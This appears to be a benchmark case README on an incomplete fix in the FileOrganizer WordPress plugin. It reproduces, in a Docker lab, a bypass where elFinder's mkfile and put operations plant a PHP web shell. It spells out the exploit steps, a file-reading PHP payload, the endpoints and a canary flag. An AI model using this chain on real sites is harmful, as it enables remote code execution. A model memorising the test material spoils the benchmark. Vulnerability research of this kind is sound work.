# fileorganizer-wordpress-plugin-cve-2026-11962

FileOrganizer (WordPress plugin) — CVE-2024-7985 -> CVE-2026-11962 (the 1.1.0 fix
adds `wp_check_filetype()` to ONLY the elFinder `upload.presave` bind; the
sibling write ops `mkfile`/`rename`/`paste`/`extract` stay unvalidated, so
`mkfile`+`put` lands a PHP web shell; arbitrary file upload -> RCE, CWE-434).
**Genuine incomplete fix; gate passed on real Docker over EXTERNAL HTTP.**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

Real WordPress (`wordpress:php8.2-apache` + `mariadb:11` + wp-cli) installing the
REAL FileOrganizer plugin at pinned wordpress.org versions (1.0.9 / 1.1.0 /
1.2.0) at up-time; no vendored plugin source. RCE canary: `${PCB_FLAG}` is
planted at `/flag/pcb_flag.txt` OUTSIDE the docroot (`/var/www/html`), so only an
executed uploaded PHP file (`<?php echo file_get_contents('/flag/pcb_flag.txt');?>`)
exfiltrates it. Driven as a low-priv WP `subscriber` granted file-manager access
via the plugin's OWN `fileorganizer_get_capability` filter (exactly what the Pro
add-on does — admins bypass the 7985 check, so the differential is only visible
for a non-admin granted user), through the real elFinder AJAX endpoint
`admin-ajax.php?action=fileorganizer_file_folder_manager`.

`patch_real.diff` is the CVE-2024-7985 first-fix (official 1.0.9 -> 1.1.0
wordpress.org zips; Trac changeset 3149878 per INCOMPLETE_FIX_ANALYSIS.md).
NVD on CVE-2026-11962 (case.json `evidence.incomplete_fix_quote`): "The
FileOrganizer plugin before 1.2.0 does not validate the file type on several of
its file-management operations ... This is an incomplete fix of CVE-2024-7985,
which only added file-type validation to the upload operation." The 1.2.0 fix
adds `mkfile.pre`/`rename.pre`/`paste.pre`/`extract.pre` validation.

- **V0 = 1.0.9** (`:39440`) — no upload validation; `cmd=upload` of
  `pcb_seed.php` lands and executes -> canary (repro.log: HTTP 200 CANARY-HIT).
- **V1 = 1.1.0** (`:39441`, target) — the 7985 fix BLOCKS the upload seed
  (`{"warning":["File type is not allowed."]}`, no canary), but `cmd=mkfile`
  `pcb_bypass.php` + `cmd=put` body are unvalidated -> the shell lands, executes,
  flag exfiltrated (HTTP 200 CANARY-HIT). Incomplete fix.
- **V2 = 1.2.0** (`:39442`, 11962 fix) — `mkfile` of a .php rejected
  (`{"mkfile":{"error":"File type is not allowed."}}`); no canary (separately
  verified per repro.log).

- **Original trigger**: elFinder `cmd=upload` of `pcb_seed.php` with the canary-
  reading PHP body (`poc/original_poc.py` candidate, `op: "upload"`).
- **Residual trigger**: elFinder `cmd=mkfile name=pcb_bypass.php` then
  `cmd=put target=<hash> content=<?php echo file_get_contents('/flag/pcb_flag.txt');?>`,
  then `GET /pcb_bypass.php` (`_heldout/bypass_poc.py` candidate,
  `op: "mkfile_put"`).

Run: `python3 oracle.py --run-gate --with-v2` (gate 2026-07-10, flag
`PCBFLAG_c01d05aa3747a66b90e2ab3d792fa6ad`: v0 seed HIT / v1 seed blocked / v1
residual HIT; passed=true; v2 closure separately verified). See `repro.log` and
`case.json`.
